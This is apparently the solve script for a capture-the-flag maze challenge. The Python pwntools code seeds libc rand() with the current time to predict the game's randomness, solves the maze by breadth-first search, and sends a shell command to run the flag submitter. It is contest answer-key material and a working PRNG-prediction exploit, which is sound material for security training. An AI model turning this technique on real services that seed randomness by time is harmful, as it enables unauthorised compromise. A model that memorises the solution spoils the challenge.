#!/usr/bin/env python3

from pwn import *
import collections
import ctypes
import time

while True:
    try:
        def srand(seed):
            libc = ctypes.CDLL("libc.so.6")
            libc.srand(seed)

        def rand():
            libc = ctypes.CDLL("libc.so.6")
            return libc.rand()

        srand(int(time.time()))

        if args.LOCAL:
            context.log_level = 'debug'
            r = process("../handout/challenge")
        else:
            r = remote(os.environ.get("HOST", "localhost"), 31337)


        def win(timeout=5):
            r.sendline(b"echo nya; ./submitter; exit")
            print(r.recvall(timeout=timeout))


        def solve_maze(maze):
            for i, line in enumerate(maze):
                for j, c in enumerate(line):
                    if c == '@':
                        sx, sy = i, j
                    elif c == '*':
                        ex, ey = i, j
            n, m = len(maze), len(maze[0])
            ans = [[None] * m for _ in range(n)]
            ansfrom = [[None] * m for _ in range(n)]
            q = collections.deque()
            ans[sx][sy] = 0
            q.append((sx, sy))
            while q:
                x, y = q.popleft()
                dx, dy, dc = [0, 0, 1, -1], [1, -1, 0, 0], "ewsn"
                for i in range(4):
                    nx, ny = x + dx[i], y + dy[i]
                    if nx < 0 or nx >= n or ny < 0 or ny >= m or maze[nx][ny] == '#':
                        continue
                    if ans[nx][ny] is None:
                        ans[nx][ny] = ans[x][y] + 1
                        ansfrom[nx][ny] = (x, y, dc[i])
                        q.append((nx, ny))
            assert ans[ex][ey] is not None
            x, y = ex, ey
            dirstr = []
            while (x, y) != (sx, sy):
                x, y, c = ansfrom[x][y]
                dirstr.append(c)
            dirstr = "".join(reversed(dirstr))
            return dirstr

        rand_cnt = r.recvuntil(b"Welcome to the maze").count(b"\r")
        for i in range(rand_cnt):
            rand()

# rand()

        def get_maze():
            r.sendlineafter(b"end the torment:", b"a")
            r.recvuntil(b"You cast arcane eye and send your summoned magical eye above the maze.\n")
            maze = []
            for i in range(30):
                maze.append(r.recvline().rstrip(b"\n").decode())
            return maze

        solution = solve_maze(get_maze())

        times_until_ok = 0
        while len(solution) >= times_until_ok:
            while (x := rand()):
                if x % 1213 == 1212:
                    break
                times_until_ok += 1

        log.info(f"Times until OK: {times_until_ok}")

        saved_dir = None
        for i in range(times_until_ok-len(solution)):
            r.recvuntil(b"Which would you like to do?")
            r.recvuntil(b"go (")
            the_dir = r.recvn(1).decode()
            if saved_dir is None:
                saved_dir = the_dir
            else:
                the_dir = {"e": "w", "w": "e", "n": "s", "s": "n"}[saved_dir]
            r.sendlineafter(b"torment:", the_dir)

        new_solution = solve_maze(get_maze())
        assert len(solution) == len(new_solution)
        for c in new_solution:
            r.sendlineafter(b"end the torment:", c.encode())

        r.recvuntil(b"You successfully exit the maze!")
        win()
        break
    except:
        r.close()
        continue
